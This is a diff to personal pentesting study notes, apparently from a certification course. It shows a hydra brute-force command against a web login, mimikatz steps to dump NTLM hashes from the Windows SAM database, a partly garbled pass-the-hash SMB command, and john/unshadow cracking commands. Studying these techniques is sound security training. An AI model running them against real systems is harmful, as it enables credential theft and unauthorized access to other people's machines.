@@ -77,7 +77,7 @@ The complete command can now be executed. We will supply the admin user name ( `
 and wordlist ( `-P` ), request verbose output with `-vV` , and use `-f` to stop the attack when the first
 successful result is found. In addition, we will supply the service module name ( `http-form-post` )
 and its required arguments ( `“/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN”` )
-`hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
+`hydra 192.168.174.10 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
 
 # Hashes
 
@@ -94,3 +94,48 @@ Example: cracking md5 (0 => md5) -a attackmode
 
 OR add `--force` run with CPU instead of GPU; 0 => md5
 `hashcat -m 0 md5hash.txt /home/kali/Documents/rockyou.txt --force`
+
+
+# Windows
+
+Oder versions of windows use LAN Manager (splitted up passwords, made them upper case) and it is known to be very weak since passwords. From Windows Vista on, the operating system disables *LM by default* and uses *NTLM*.
+NTLM hashes are stored in the SAM database but are still not salted. 
+
+To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3), which partially encrypts the SAM file.
+It’s worth mentioning that the SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive file system lock on the file, but we can use minikatz:
+
+## Using mimikatz to dump the password hashes from the SAM database on your Windows
+
+* Start it `C:\Tools\password_attacks\mimikatz.exe` => needs to be started with admin
+* `privilege::debug` && `token::elevate` => check permission should return OK, enables the SeDebugPrivilge access right required to tamper with another process. If this commands fails, mimikatz was most likely not executed with administrative privileges.
+* Now we can use `lsadump::sam` to dump the contents of the SAM database, output like this and we get the hash pw of the user
+```
+RID  : 000003ea (1002)
+User : student
+  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+    ...
+```
+
+Other hash dumping tools, including pwdump, fgdump, 577 and Windows
+Credential Editor (wce) 578 work well against older Windows operating systems
+like Windows XP and Windows Server 2003.
+
+## Passing the Hash in Windows
+Checking hashes for PWs can be very time consuming. But The Pass-the-Hash (PtH) technique (discovered in 1997) allows an attacker to authenticate to a remote target by using a valid combination of username and NTLM/LM hash rather than a clear text password. This is possible because NTLM/LM password hashes are not salted and remain static between sessions. Moreover, if we discover a password hash on one target, we cannot only use it to authenticate to that target, we can use it to authenticate to another target as well.
+
+* Performing authentication using the SMB protocol: 
+offsec is the user name, `aaad3...` `289...`is the hashed pw of the user. offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`
+
+# Password cracking
+If a salt is involved in the authentication process and we do not know what that salt value is, cracking could become extremely complex, if not impossible, as we must repeatedly hash each potential clear text password with various salts. But usally the salt is store in databases.
+
+* to bruteforce file (windows hashes), file containing the hash `sudo john hash.txt --format=NT`
+* to bruteforce with special worklist: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT`
+
+## linux
+In order to crack Linux-based hashes with JTR, we will need to first use the unshadow utility to combine the passwd and shadow files from the compromised system.
+* `unshadow passwd-file.txt shadow-file.txt`, then `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
+* `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`
+
+## hascat for faster cracking (via gpu)
+see (cyptro.md)
